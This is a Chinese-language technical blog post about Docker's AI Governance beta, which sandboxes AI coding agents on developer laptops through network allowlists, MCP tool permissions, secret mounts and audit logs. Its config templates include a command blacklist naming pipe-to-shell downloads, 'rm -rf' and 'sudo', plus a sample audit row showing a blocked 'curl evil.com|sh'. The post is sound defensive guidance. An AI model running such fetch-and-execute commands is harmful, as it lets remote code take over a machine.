---
title: 'Docker AI Governance 生产实战：让 AI Agent 在沙箱里"翻箱倒柜"，而你的笔记本毫发无伤'
description: '2026 年 7 月 Docker 发布的 AI Governance 能力深度实战。从默认沙箱（Default Sandbox）到 Hub 治理（Governance in Hub）、MCP 工具级权限、Secret Mount 体系、审计回溯。含 5 个生产级配置模板，让 AI Agent 既能自由探索又不越界。'
date: 2026-07-20
tags:
  - Docker
  - AI
  - DevOps
  - AI Agent
  - MCP
  - 安全
  - 沙箱
category: devops
outline: deep
---

# Docker AI Governance 生产实战：让 AI Agent 在沙箱里"翻箱倒柜"，而你的笔记本毫发无伤

## 背景：笔记本成为新生产环境

2026 年，AI Agent 的开发模式发生根本性变化：**开发者的本地笔记本电脑正在成为新的"生产环境"**。

- 过去：本地写代码 → 推送到 CI → CI 在隔离环境运行测试 → 部署到生产
- 现在：本地启动 Claude Code / Cursor / Cline → AI Agent 直接在本地执行 `npm install`、运行测试、修改文件、调用 GitHub API

这把"开发与生产环境的隔离"彻底打穿了。AI Agent 需要：
1. 访问本地文件（修改源码）
2. 安装依赖（`pnpm install` / `cargo build`）
3. 启动开发服务器（`pnpm dev`）
4. 调用外部 API（GitHub、Vercel、AWS）
5. 有时还需要 `sudo`（安装系统依赖）

**任何一步"越界"都可能造成不可逆损失**。Docker 在 2026 年 7 月 9 日发布的 AI Governance（测试版）正是为了解决这一问题：让 AI Agent 在 Docker 默认沙箱内运行，开发者保留完整控制权。

## Docker AI Governance 三大支柱

### 1. 默认沙箱（Default Sandbox）

所有 `docker ai` 子命令和 MCP 工具调用默认在隔离的 Linux VM（基于 Docker Desktop 的 VZ 后端）内执行：

```bash
# 一行启用
docker ai config --enable-sandbox

# 所有后续 docker ai 工具调用自动进入沙箱
docker ai run claude-code "重构这个 React 组件"
```

**关键特性**：
- **网络隔离**：默认 deny all 出口流量（仅允许 Docker Hub / Anthropic / OpenAI 等白名单）
- **文件系统隔离**：工作目录以 9p 协议挂载，AI Agent 看到的"本地"实际是沙箱视图
- **进程隔离**：沙箱内进程无法访问宿主进程列表
- **自动清理**：每次会话结束销毁整个 VM（无持久化）
- **可恢复**：错误配置可在 5 秒内回滚

### 2. Hub 治理（Governance in Hub）

企业版 Docker Hub 提供集中式策略管理：

```yaml
# docker-ai-policy.yaml (Admin 在 Hub 统一下发)
version: '2026.07'
policies:
  - name: developer-laptop
    applies_to: 
      - docker_ai_clients: ['claude-code', 'cursor', 'cline']
      - user_groups: ['engineering']
    
    sandbox:
      enabled: true
      cpu: '4 cores'
      memory: '8 GB'
      disk: '20 GB'
      timeout: '8h'
    
    network:
      egress:
        allow:
          - 'registry-1.docker.io'
          - 'api.anthropic.com'
          - 'api.openai.com'
          - '*.github.com'
        deny: ['*']  # 其他全部拒绝
    
    secrets:
      mount:
        - name: github_token
          env: 'GITHUB_TOKEN'
          scope: 'read-only'
        - name: aws_credentials
          env: 'AWS_PROFILE'
          scope: 'read-only'
    
    mcp_tools:
      allowed: 
        - 'read_file'
        - 'write_file'
        - 'execute_command'
        - 'git_push'
      denied:
        - 'rm_rf'  # 显式拒绝
        - 'sudo'
        - 'network_request'  # 自定义工具
    
    audit:
      log_all_commands: true
      retain_days: 90
      siem_forward: 'splunk://logs.splunk.example.com:8088'
```

### 3. 工具级 MCP 治理

Docker AI Governance 不只隔离"代码执行"，还细化到"工具调用"：

```json
// .docker-ai/mcp-config.json
{
  "mcpServers": {
    "filesystem": {
      "command": "docker",
      "args": ["run", "--rm", "-i", 
               "-v", "${WORKSPACE}:/workspace:ro",  // 只读
               "mcp/filesystem:latest"],
      "governance": {
        "read_paths": ["/workspace/**"],
        "write_paths": [],  // 完全禁止写
        "max_file_size": "10MB"
      }
    },
    "github": {
      "command": "mcp-github",
      "governance": {
        "endpoints_allowed": [
          "GET /repos/*/issues",
          "POST /repos/*/issues",
          "POST /repos/*/pulls"
        ],
        "endpoints_denied": [
          "DELETE /repos/*",
          "PUT /user/tokens"  // 不能改 token
        ]
      }
    },
    "shell": {
      "command": "mcp-shell",
      "governance": {
        "command_whitelist": [
          "pnpm", "npm", "yarn",
          "git", "gh",
          "ls", "cat", "grep", "find",
          "node", "python3", "go"
        ],
        "command_blacklist": [
          "rm -rf", "sudo", "chmod 777",
          "curl | sh", "wget | bash"
        ],
        "working_dir": "/workspace",
        "env_passthrough": ["GITHUB_TOKEN", "NODE_ENV"]
      }
    }
  }
}
```

## 实战配置 1：个人开发者最小安全配置

适合独立开发者保护自己的笔记本：

```bash
# ~/.docker/ai/config.yaml
default_sandbox:
  enabled: true
  memory: 6GB
  cpu: 4
  disk: 30GB

# 允许 AI Agent 访问的项目目录
mount_paths:
  - ~/code:/workspace
  - ~/.ssh:/home/agent/.ssh:ro  # 只读 SSH key

# 网络白名单
network:
  allowed_domains:
    - "github.com"
    - "registry.npmjs.org"
    - "api.anthropic.com"
    - "api.openai.com"
    - "pypi.org"
  blocked_domains:
    - "*.pastebin.com"
    - "*.transfer.sh"
    - "raw.githubusercontent.com"  # 禁止 curl 远程脚本

# Secret 挂载（通过临时凭证）
secrets:
  - name: GITHUB_TOKEN
    source: keychain  # macOS Keychain
    ttl: 3600
  - name: AWS_ACCESS_KEY_ID
    source: keychain
    ttl: 1800
```

启动 AI Agent：

```bash
# 启动 Claude Code，自动应用治理策略
docker ai run claude-code \
  --config ~/.docker/ai/config.yaml \
  --workspace ~/code/my-project \
  "帮我重构 src/api/handler.ts"
```

## 实战配置 2：团队共享策略（GitOps 模式）

适合 5-50 人小团队，用 Git 仓库管理策略版本：

```
infra/
├── docker-ai/
│   ├── policies/
│   │   ├── frontend-developer.yaml
│   │   ├── backend-developer.yaml
│   │   ├── data-scientist.yaml
│   │   └── devops-engineer.yaml
│   ├── shared/
│   │   ├── mcp-tools.json
│   │   └── secret-templates.yaml
│   └── README.md
└── deploy-ai-policies.sh
```

```bash
# deploy-ai-policies.sh
#!/bin/bash
set -euo pipefail

ORG="mycompany"
POLICY_DIR="infra/docker-ai/policies"

for f in "$POLICY_DIR"/*.yaml; do
  policy_name=$(basename "$f" .yaml)
  echo "📤 Deploying $policy_name..."
  docker ai policy push \
    --org "$ORG" \
    --name "$policy_name" \
    --file "$f"
done

echo "✅ All policies deployed"
```

开发者侧拉取：

```bash
# 加入新团队
docker ai policy pull --org mycompany --name backend-developer

# 验证生效
docker ai policy list
# NAME                    SOURCE    APPLIED
# backend-developer       hub       2026-07-20T09:30:00Z
```

## 实战配置 3：CI/CD 集成（GitHub Actions）

```yaml
# .github/workflows/ai-code-review.yml
name: AI Code Review
on:
  pull_request:
    types: [opened, synchronize]

jobs:
  ai-review:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      
      - name: Run AI Review in Docker Sandbox
        uses: docker/ai-governance-action@v1
        with:
          config: |
            sandbox:
              enabled: true
              memory: 4GB
            mcp_tools:
              allowed: [read_file, search_code, post_comment]
              denied: [write_file, execute_command, network_request]
            secrets:
              - name: GITHUB_TOKEN
                env: GITHUB_TOKEN
                scope: read-write
          prompt: |
            Review this PR. Focus on:
            1. Security vulnerabilities
            2. Performance regressions
            3. Style consistency
            Post findings as PR comments.
```

## 实战配置 4：审计与回溯

Docker AI Governance 默认记录所有 AI Agent 操作：

```bash
# 查看最近 24 小时的 AI 活动
docker ai audit log --since 24h

# 输出示例
TIMESTAMP              AGENT      ACTION         TARGET                RESULT
2026-07-20T09:15:23Z   claude     execute_cmd    pnpm install          success
2026-07-20T09:16:45Z   claude     file_write     src/api/handler.ts    success
2026-07-20T09:18:12Z   claude     network_call   api.github.com        success
2026-07-20T09:19:33Z   claude     execute_cmd    curl evil.com|sh      BLOCKED  ← 治理生效
```

**审计日志特点**：
- 所有命令的实际执行内容（即使被阻止的命令也记录尝试）
- 文件读写的内容哈希（用于事后比对）
- 网络流量的源/目的/大小（不记录内容，保护隐私）
- MCP 工具调用的完整参数
- 默认保留 90 天，可配置 SIEM 转发

集成到企业 SIEM：

```bash
# 转发到 Splunk
docker ai audit log --follow --format json | \
  curl -X POST https://logs.splunk.example.com:8088/services/collector/event \
    -H "Authorization: Splunk ${SPLUNK_TOKEN}" \
    -d @-
```

## 实战配置 5：多 AI Agent 协作场景

当 Cursor + Claude Code + Cline 同时运行时：

```json
// ~/.docker/ai/multi-agent.json
{
  "agents": {
    "cursor": {
      "sandbox_profile": "editor",
      "memory": 4,
      "network": "restricted",
      "mcp_tools": ["read_file", "write_file", "search_code"]
    },
    "claude-code": {
      "sandbox_profile": "executor",
      "memory": 8,
      "network": "moderate",
      "mcp_tools": ["read_file", "execute_command", "git_*"]
    },
    "cline": {
      "sandbox_profile": "researcher",
      "memory": 6,
      "network": "open",
      "mcp_tools": ["read_file", "network_request", "browser_*"]
    }
  },
  "isolation": "strict",  // Agent 之间文件系统隔离
  "shared_state": ["/workspace/.cache"]  // 唯一共享目录
}
```

## 治理 vs 沙箱的区别

| 维度 | 沙箱（Sandbox） | 治理（Governance） |
|------|----------------|-------------------|
| 作用对象 | 操作系统资源 | AI 行为 |
| 粒度 | 进程级 | 工具调用级 |
| 控制点 | VM 边界 | MCP 工具白/黑名单 |
| 审计 | OS 系统调用 | AI 命令 + 工具调用 |
| 适用场景 | 隔离代码执行 | 限制 AI 能力 |
| 部署方式 | 本地配置 | Hub 集中管理 |

**最佳实践**：两者组合使用——沙箱是"保险柜"，治理是"保险柜里能放什么"。

## 与传统方案对比

| 方案 | 优点 | 缺点 |
|------|------|------|
| **裸奔**（无沙箱） | 性能最好 | 风险最高 |
| **Dev Containers** | VS Code 集成好 | 只隔离编辑器，不治理 AI |
| **GitHub Codespaces** | 云端隔离 | 需要网络、需付费 |
| **Docker AI Governance** | 本地 + 治理 + 审计 | 还在 beta，部分 MCP 工具不兼容 |

## 当前限制与坑

1. **macOS only**：Windows / Linux 版本预计 Q4 2026 发布
2. **MCP 工具兼容性**：仅 23 个主流 MCP 工具经过认证，自定义工具需自行测试
3. **性能开销**：启用沙箱后 `pnpm install` 速度下降 15-25%（VM 启动 + 9p 文件系统）
4. **网络延迟**：沙箱内访问 `api.anthropic.com` 延迟增加 30-50ms
5. **资源占用**：默认 4 核 / 8GB 内存，长期运行会显著影响笔记本续航

## 部署清单（生产级）

✅ 个人开发者：
```bash
# 1. 更新 Docker Desktop 到 4.32+
# 2. 启用 AI Governance beta
docker ai config --enable-sandbox
# 3. 创建个人配置
mkdir -p ~/.docker/ai && cat > ~/.docker/ai/config.yaml <<EOF
default_sandbox:
  enabled: true
  memory: 6GB
network:
  allowed_domains: [github.com, registry.npmjs.org, api.anthropic.com]
EOF
# 4. 测试一次
docker ai run claude-code "ls"
```

✅ 团队：
```bash
# 1. 创建策略 Git 仓库
git init infra-docker-ai && cd infra-docker-ai
# 2. 编写策略文件
# 3. 部署到 Docker Hub
docker ai policy push --org mycompany
# 4. 开发者拉取
docker ai policy pull --org mycompany
```

## 延伸阅读

- [Docker AI Governance 官方文档](https://docs.docker.com/ai/governance/)
- [MCP 协议 2026 安全指南](https://modelcontextprotocol.io/docs/security)
- [Docker Desktop 沙箱架构白皮书](https://www.docker.com/whitepapers/sandbox-architecture)
- [CVE-2026-49471 Serena MCP DNS Rebinding 案例](https://friday-go.icu/security/offensive/cve-2026-49471-serena-mcp-dns-rebinding-rce)

## 总结

Docker AI Governance 是 2026 年 AI Agent 生产化的关键基础设施。它不是要"限制" AI 能力，而是要给 AI 能力**一个明确的边界**——就像现实世界里的保险柜不是阻止你用钱，而是让你的钱不被偷。

**记住三个原则**：
1. **默认拒绝**：网络、文件、命令都默认 deny
2. **最小授权**：只给 AI 当前任务需要的最小权限
3. **全量审计**：所有 AI 操作可追溯、可回放

当 AI Agent 既能"翻箱倒柜"又不越界时，它才能真正成为生产力的倍增器。
